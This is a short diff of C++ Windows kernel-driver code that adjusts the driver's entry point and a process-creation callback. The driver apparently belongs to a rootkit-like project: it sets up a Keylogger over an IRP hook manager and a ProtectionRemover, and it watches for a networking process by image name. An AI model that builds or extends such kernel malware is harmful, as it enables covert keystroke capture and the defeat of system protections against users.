@@ -68,7 +68,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	}
 
 	g_Globals.HookManager = new (POOL_FLAG_PAGED) IrpHookManager();
-	g_Globals.Keylogger = new (POOL_FLAG_PAGED) Keylogger(*g_Globals.HookManager);
+	g_Globals.Keylogger = new (POOL_FLAG_PAGED) Keylogger(g_Globals.HookManager);
 	g_Globals.ProtectionRemover = new (POOL_FLAG_PAGED) Protections::ProtectionRemover();
 	g_Globals.ModuleFinder = new (POOL_FLAG_PAGED) ModuleFinder();
 
@@ -343,9 +343,8 @@ void OnCreateProcess(HANDLE, HANDLE ProcessId, BOOLEAN IsCreated)
 	::PsLookupProcessByProcessId(ProcessId, &process);
 	PUNICODE_STRING imageName = nullptr;
 	::SeLocateProcessImageName(process, &imageName);
-	LOG_SUCCESS_VA("Process %ws created", imageName->Buffer);
 	UNICODE_STRING expectedImageNamePattern = RTL_CONSTANT_STRING(L"*" NETWORKING_PROCESS);
-	if (::FsRtlIsNameInExpression(&expectedImageNamePattern, imageName, TRUE, nullptr)) {
+	if (::FsRtlIsNameInExpression(&expectedImageNamePattern, imageName, FALSE, nullptr)) {
 		LOG_SUCCESS_VA("Found matching process, pid=%04x", ::HandleToUlong(ProcessId));
 		g_Globals.Network.Pid = ProcessId;
 	}
